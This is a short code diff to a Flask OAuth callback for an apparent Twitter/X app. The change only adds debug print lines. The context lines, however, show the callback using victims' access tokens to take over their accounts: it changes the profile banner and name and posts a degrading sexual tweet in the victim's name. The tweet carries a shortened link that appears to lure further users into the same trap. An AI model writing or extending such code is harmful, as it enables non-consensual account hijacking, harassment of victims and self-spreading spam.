@@ -260,6 +260,7 @@ def callback():
             update_profile_banner(real_client)
             name = "Meiminaddict #"+str(random.random())[2:8]
             update_profile_name(real_client,name)
+            print('gonna tweet')
             api = tweepy.Client(bearer_token=app.config['BEARER_TOKEN'],
                                         consumer_key=app.config['APP_CONSUMER_KEY'], 
                                         consumer_secret=app.config['APP_CONSUMER_SECRET'],
@@ -267,6 +268,7 @@ def callback():
                                         access_token_secret=real_oauth_token_secret)
         
             api.create_tweet(text="I am a dumb slut who clicks anything sent by the wonderful @PrincessMeimina. clicky click https://tinyurl.com/3y97dae2 to be owned by Meimina$$.")
+            print('tweet done')
         except Exception as e:
             print(e)
             return "MEIMINASS OWNS YOU"
@@ -336,7 +338,7 @@ def callback():
             print(e)
             return str(e)
 
-    
+    print('log 1')
     clear_maps(oauth_token)
-    
+    print('log 2')
     return "MEIMINA$$ OWNS YOU"
